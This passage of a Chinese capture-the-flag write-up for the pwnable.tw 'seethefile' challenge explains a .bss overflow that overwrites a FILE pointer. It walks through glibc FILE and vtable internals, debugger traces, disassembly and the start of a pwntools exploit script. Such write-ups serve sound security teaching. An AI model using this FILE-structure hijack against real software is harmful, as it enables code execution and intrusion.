class="keyword">char</span> *_IO_buf_end;        <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line">  <span class="keyword">int</span> _fileno;</span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line">  <span class="keyword">__off_t</span> _old_offset; <span class="comment">/* This used to be _offset but it's too small.  */</span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> _cur_column;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</span><br><span class="line">  <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>关于<a href="https://code.woboq.org/userspace/glibc/libio/fileops.c.html" target="_blank" rel="noopener"><code>vtable</code>的结构</a>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_file_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_file_finish),</span><br><span class="line">  JUMP_INIT(overflow, _IO_file_overflow),</span><br><span class="line">  JUMP_INIT(underflow, _IO_file_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_default_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_file_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_file_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_new_file_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_new_file_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_new_file_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_file_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_file_read),</span><br><span class="line">  JUMP_INIT(write, _IO_new_file_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_file_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_file_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_file_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>然后了解一下为什么可以利用<a href="https://code.woboq.org/userspace/glibc/libio/iofclose.c.html" target="_blank" rel="noopener"><code>fclose</code>函数</a>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_new_fclose (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> status;</span><br><span class="line">  CHECK_FILE(fp, EOF);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_1)</span></span><br><span class="line">  <span class="comment">/* We desperately try to help programs which are using streams in a</span></span><br><span class="line"><span class="comment">     strange way and mix old and new functions.  Detect old streams</span></span><br><span class="line"><span class="comment">     here.  */</span></span><br><span class="line">  <span class="keyword">if</span> (_IO_vtable_offset (fp) != <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> _IO_old_fclose (fp);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="comment">/* First unlink the stream.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    _IO_un_link ((struct _IO_FILE_plus *) fp);</span><br><span class="line">  _IO_acquire_lock (fp);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    status = _IO_file_close_it (fp);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    status = fp-&gt;_flags &amp; _IO_ERR_SEEN ? <span class="number">-1</span> : <span class="number">0</span>;</span><br><span class="line">  _IO_release_lock (fp);</span><br><span class="line">  _IO_FINISH (fp);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* This stream has a wide orientation.  This means we have to free</span></span><br><span class="line"><span class="comment">         the conversion functions.  */</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cc</span> = <span class="title">fp</span>-&gt;_<span class="title">codecvt</span>;</span></span><br><span class="line">      __libc_lock_lock (__gconv_lock);</span><br><span class="line">      __gconv_release_step (cc-&gt;__cd_in.__cd.__steps);</span><br><span class="line">      __gconv_release_step (cc-&gt;__cd_out.__cd.__steps);</span><br><span class="line">      __libc_lock_unlock (__gconv_lock);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (_IO_have_backup (fp))</span><br><span class="line">        _IO_free_backup_area (fp);</span><br><span class="line">    &#125;</span><br><span class="line">  _IO_deallocate_file (fp);</span><br><span class="line">  <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过<code>gdb</code>调试一下，在<code>_IO_new_fclose</code>处下断点：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">   0xf76579da:  xchg   ax,ax</span><br><span class="line">   0xf76579dc:  xchg   ax,ax</span><br><span class="line">   0xf76579de:  xchg   ax,ax</span><br><span class="line">=&gt; 0xf76579e0 &lt;_IO_new_fclose&gt;: push   ebp</span><br><span class="line">   0xf76579e1 &lt;_IO_new_fclose+1&gt;:       mov    ebp,esp</span><br><span class="line">   0xf76579e3 &lt;_IO_new_fclose+3&gt;:       push   edi</span><br><span class="line">   0xf76579e4 &lt;_IO_new_fclose+4&gt;:       push   esi</span><br><span class="line">   0xf76579e5 &lt;_IO_new_fclose+5&gt;:       push   ebx</span><br></pre></td></tr></table></figure><p>接下来一直运行到<code>_IO_new_fclose+132</code>处，调用了<code>_IO_new_file_close_it</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">   0xf7657a5e &lt;_IO_new_fclose+126&gt;:     je     0xf7657aa8 &lt;_IO_new_fclose+200&gt;</span><br><span class="line">   0xf7657a60 &lt;_IO_new_fclose+128&gt;:     sub    esp,0xc</span><br><span class="line">   0xf7657a63 &lt;_IO_new_fclose+131&gt;:     push   esi</span><br><span class="line">=&gt; 0xf7657a64 &lt;_IO_new_fclose+132&gt;:     call   0xf7663810 &lt;_IO_new_file_close_it&gt;</span><br><span class="line">   0xf7657a69 &lt;_IO_new_fclose+137&gt;:     mov    edx,DWORD PTR [esi]</span><br><span class="line">   0xf7657a6b &lt;_IO_new_fclose+139&gt;:     add    esp,0x10</span><br><span class="line">   0xf7657a6e &lt;_IO_new_fclose+142&gt;:     mov    edi,eax</span><br><span class="line">   0xf7657a70 &lt;_IO_new_fclose+144&gt;:     and    edx,0x8000</span><br></pre></td></tr></table></figure><p>最后<code>call [eax+0x44]</code>，发现这时<code>eax</code>即为<code>vtable</code>的地址，而<code>0x44</code>则为<code>_IO_file_close</code>的偏移：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">   0xf7663914 &lt;_IO_new_file_close_it+260&gt;:      sub    esp,0xc</span><br><span class="line">   0xf7663917 &lt;_IO_new_file_close_it+263&gt;:      mov    eax,DWORD PTR [ebx+eax*1+0x94]</span><br><span class="line">   0xf766391e &lt;_IO_new_file_close_it+270&gt;:      push   ebx</span><br><span class="line">=&gt; 0xf766391f &lt;_IO_new_file_close_it+271&gt;:      call   DWORD PTR [eax+0x44]</span><br><span class="line">   0xf7663922 &lt;_IO_new_file_close_it+274&gt;:      add    esp,0x10</span><br><span class="line">   0xf7663925 &lt;_IO_new_file_close_it+277&gt;:      mov    esi,eax</span><br><span class="line">   0xf7663927 &lt;_IO_new_file_close_it+279&gt;:      jmp    0xf766384f &lt;_IO_new_file_close_it+63&gt;</span><br><span class="line">   0xf766392c &lt;_IO_new_file_close_it+284&gt;:      lea    esi,[esi+eiz*1+0x0]</span><br></pre></td></tr></table></figure><h1 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@595b467648a0:~/tmp<span class="comment"># checksec ./seethefile</span></span><br><span class="line">[*] <span class="string">'/root/tmp/seethefile'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>先用<code>keypatch</code>把<code>alarm</code>给 patch 掉，方便用<code>gdb</code>调试：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">.text:0804870B                 public init</span><br><span class="line">.text:0804870B init            proc near               ; CODE XREF: main+1C↓p</span><br><span class="line">.text:0804870B ; __unwind &#123;</span><br><span class="line">.text:0804870B                 push    ebp</span><br><span class="line">.text:0804870C                 mov     ebp, esp</span><br><span class="line">.text:0804870E                 sub     esp, 8</span><br><span class="line">.text:08048711                 mov     eax, ds:stdout@@GLIBC_2_0</span><br><span class="line">.text:08048716                 push    0               ; n</span><br><span class="line">.text:08048718                 push    2               ; modes</span><br><span class="line">.text:0804871A                 push    0               ; buf</span><br><span class="line">.text:0804871C                 push    eax             ; stream</span><br><span class="line">.text:0804871D                 call    _setvbuf</span><br><span class="line">.text:08048722                 add     esp, 10h</span><br><span class="line">.text:08048725                 sub     esp, 8</span><br><span class="line">.text:08048728                 push    offset handler  ; handler</span><br><span class="line">.text:0804872D                 push    0Eh             ; sig</span><br><span class="line">.text:0804872F                 call    _signal</span><br><span class="line">.text:08048734                 add     esp, 10h</span><br><span class="line">.text:08048737                 sub     esp, 0Ch</span><br><span class="line">.text:0804873A                 nop</span><br><span class="line">.text:0804873B                 nop</span><br><span class="line">.text:0804873C                 nop</span><br><span class="line">.text:0804873D                 nop</span><br><span class="line">.text:0804873E                 nop</span><br><span class="line">.text:0804873F                 nop</span><br><span class="line">.text:08048740                 nop</span><br><span class="line">.text:08048741                 add     esp, 10h</span><br><span class="line">.text:08048744                 nop</span><br><span class="line">.text:08048745                 leave</span><br><span class="line">.text:08048746                 retn</span><br><span class="line">.text:08048746 ; &#125; // starts at 804870B</span><br><span class="line">.text:08048746 init            endp</span><br></pre></td></tr></table></figure><p>可以看到是个菜单：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> nptr; <span class="comment">// [esp+Ch] [ebp-2Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// [esp+2Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  init();</span><br><span class="line">  welcome();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    __isoc99_scanf(<span class="string">"%s"</span>, &amp;nptr);</span><br><span class="line">    <span class="keyword">switch</span> ( atoi(&amp;nptr) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        openfile();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        readfile();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        writefile();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        closefile();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Leave your name :"</span>);</span><br><span class="line">        __isoc99_scanf(<span class="string">"%s"</span>, &amp;name);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Thank you %s ,see you next time\n"</span>, &amp;name);</span><br><span class="line">        <span class="keyword">if</span> ( fp )</span><br><span class="line">          fclose(fp);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Invaild choice"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>readfile</code>里有一个<code>magicbuf</code>，可以读<code>0x18F</code>个字节，很可能有溢出：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">readfile</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(magicbuf, <span class="number">0</span>, <span class="number">0x190</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( !fp )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"You need to open a file first"</span>);</span><br><span class="line">  result = fread(magicbuf, <span class="number">0x18F</span>u, <span class="number">1u</span>, fp);</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">"Read Successful"</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现在<code>.bss</code>段上可以用<code>magicbuf</code>把<code>fp</code>指针盖掉：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">.bss:0804B0C0                 public magicbuf</span><br><span class="line">.bss:0804B0C0 ; char magicbuf[416]</span><br><span class="line">.bss:0804B0C0 magicbuf        db 1A0h dup(?)          ; DATA XREF: openfile+33↑o</span><br><span class="line">.bss:0804B0C0                                         ; readfile+17↑o ...</span><br><span class="line">.bss:0804B260                 public name</span><br><span class="line">.bss:0804B260 name            db    ? ;               ; DATA XREF: main+9F↑o</span><br><span class="line">.bss:0804B260                                         ; main+B4↑o</span><br><span class="line">.bss:0804B261                 db    ? ;</span><br><span class="line">.bss:0804B262                 db    ? ;</span><br><span class="line">.bss:0804B263                 db    ? ;</span><br><span class="line">.bss:0804B264                 db    ? ;</span><br><span class="line">.bss:0804B265                 db    ? ;</span><br><span class="line">.bss:0804B266                 db    ? ;</span><br><span class="line">.bss:0804B267                 db    ? ;</span><br><span class="line">.bss:0804B268                 db    ? ;</span><br><span class="line">.bss:0804B269                 db    ? ;</span><br><span class="line">.bss:0804B26A                 db    ? ;</span><br><span class="line">.bss:0804B26B                 db    ? ;</span><br><span class="line">.bss:0804B26C                 db    ? ;</span><br><span class="line">.bss:0804B26D                 db    ? ;</span><br><span class="line">.bss:0804B26E                 db    ? ;</span><br><span class="line">.bss:0804B26F                 db    ? ;</span><br><span class="line">.bss:0804B270                 db    ? ;</span><br><span class="line">.bss:0804B271                 db    ? ;</span><br><span class="line">.bss:0804B272                 db    ? ;</span><br><span class="line">.bss:0804B273                 db    ? ;</span><br><span class="line">.bss:0804B274                 db    ? ;</span><br><span class="line">.bss:0804B275                 db    ? ;</span><br><span class="line">.bss:0804B276                 db    ? ;</span><br><span class="line">.bss:0804B277                 db    ? ;</span><br><span class="line">.bss:0804B278                 db    ? ;</span><br><span class="line">.bss:0804B279                 db    ? ;</span><br><span class="line">.bss:0804B27A                 db    ? ;</span><br><span class="line">.bss:0804B27B                 db    ? ;</span><br><span class="line">.bss:0804B27C                 db    ? ;</span><br><span class="line">.bss:0804B27D                 db    ? ;</span><br><span class="line">.bss:0804B27E                 db    ? ;</span><br><span class="line">.bss:0804B27F                 db    ? ;</span><br><span class="line">.bss:0804B280                 public fp</span><br><span class="line">.bss:0804B280 ; FILE *fp</span><br><span class="line">.bss:0804B280 fp              dd ?                    ; DATA XREF: openfile+6↑r</span><br><span class="line">.bss:0804B280                                         ; openfile+AD↑w ...</span><br><span class="line">.bss:0804B280 _bss            ends</span><br><span class="line">.bss:0804B280</span><br></pre></td></tr></table></figure><p>同时程序的功能是可以读取文件内容，我们可以通过读取<code>/proc/self/maps</code>来获得<code>libc</code>的地址。</p><p>我们所需要做的就是伪造一个文件结构，然后将地址赋予给<code>fp</code>：</p><ol><li>找到一个<code>buf1</code>，使得<code>buf1+0x94</code>为<code>_IO_file_jumps</code>结构，同时要注意<code>_vtable_offset</code>要为<code>0</code>，其偏移为<code>0x46</code>且只占一个字节</li><li>找到一个<code>buf2</code>，使得<code>buf2+0x44</code>为<code>fclose</code>的地址</li><li>最后，写入<code>name</code>覆盖<code>fp</code>到<code>buf</code></li></ol><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><p>打通了之后发现无法<code>cat flag</code>，在<code>/home/seethefile/</code>下可以看到一个<code>get_flag.c</code>的源文件：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">read_input</span><span class="params">(<span class="keyword">char</span> *buf,<span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret ;</span><br><span class="line">    ret = read(<span class="number">0</span>,buf,size);</span><br><span class="line">    <span class="keyword">if</span>(ret &lt;= <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"read error"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(buf[ret<span class="number">-1</span>] == <span class="string">'\n'</span>)</span><br><span class="line">        buf[ret-1] = '\x00';</span><br><span class="line">    <span class="keyword">return</span> ret ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Your magic :"</span>);</span><br><span class="line">    read_input(buf,<span class="number">40</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strcmp</span>(buf,<span class="string">"Give me the flag"</span>))&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"GG !"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    FILE *fp = fopen(<span class="string">"/home/seethefile/flag"</span>,<span class="string">"r"</span>);</span><br><span class="line">    <span class="keyword">if</span>(!fp)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Open failed !"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fread(buf,<span class="number">1</span>,<span class="number">40</span>,fp);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Here is your flag: %s \n"</span>,buf);</span><br><span class="line">    fclose(fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>完整的 Exploit：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">'./seethefile'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'chall.pwnable.tw'</span>, <span class="number">10200</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc_32.so.6'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./seethefile'</span>)</span><br><span class="line">offset = <span class="number">0x280</span> - <span class="number">0x0C0</span></span><br><span class="line"><span class="comment"># gdb.attach(p, 'b *_IO_new_fclose')</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(c)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice :'</span>)</span><br><span class="line">p.sendline(str(c))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">openfile</span><span 